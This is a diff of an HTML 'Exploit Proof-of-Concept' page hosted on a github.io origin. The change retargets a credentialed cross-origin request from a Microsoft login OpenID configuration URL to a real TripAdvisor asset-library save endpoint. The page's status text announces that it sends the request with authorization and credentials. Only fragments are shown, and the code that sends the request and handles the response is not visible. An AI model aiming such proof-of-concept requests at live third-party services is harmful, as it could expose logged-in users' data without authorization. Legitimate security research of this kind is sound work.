@@ -17,7 +17,7 @@
 
 <div class="box">
     <h2>Exploit Proof-of-Concept</h2>
-    <p>Target: <code>https://login.windows.net/tripadvisor.com/.well-known/openid-configuration</code></p>
+    <p>Target: <code>https://assetlibrary.tripadvisor.com/transferbox/save/</code></p>
     <p>Source Origin: <code>https://stelemane.github.io</code></p>
     
     <div id="status" class="status">[*] Initializing Request...</div>
@@ -29,7 +29,7 @@
         const statusDiv = document.getElementById('status');
         const outputDiv = document.getElementById('output');
         
-        const target = "https://login.windows.net/tripadvisor.com/.well-known/openid-configuration";
+        const target = "https://assetlibrary.tripadvisor.com/transferbox/save/";
 
         statusDiv.innerText = "[*] Sending request with Authorization & Credentials (No Fingerprint)...";
 
